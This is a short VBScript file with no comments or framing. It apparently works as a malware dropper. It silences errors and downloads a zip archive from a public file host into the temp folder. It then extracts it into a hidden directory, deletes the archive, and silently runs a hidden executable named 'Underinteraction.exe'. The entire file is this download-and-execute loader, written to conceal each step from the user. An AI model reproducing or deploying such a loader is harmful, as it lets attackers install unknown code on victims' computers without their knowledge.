On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
temp = objShell.ExpandEnvironmentStrings("%TEMP%")
zipUrl = "https://files.catbox.moe/zariy7.zip"
zipPath = temp & "\d.zip"
extPath = temp & "\e"

objHTTP.Open "GET", zipUrl, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile zipPath, 2
    objStream.Close

    objFSO.GetFile(zipPath).Attributes = objFSO.GetFile(zipPath).Attributes Or 2
End If

If Not objFSO.FolderExists(extPath) Then
    Set newFolder = objFSO.CreateFolder(extPath)
    newFolder.Attributes = newFolder.Attributes Or 2
End If

Set objZip = CreateObject("Shell.Application")
Set objFolder = objZip.NameSpace(zipPath)
If Not objFolder Is Nothing Then
    objZip.NameSpace(extPath).CopyHere objFolder.Items, 16
    If objFSO.FileExists(zipPath) Then objFSO.DeleteFile zipPath, True
End If

exePath = extPath & "\Underinteraction.exe"
If objFSO.FileExists(exePath) Then
    objFSO.GetFile(exePath).Attributes = objFSO.GetFile(exePath).Attributes Or 2
    objShell.Run exePath, 0, False
End If
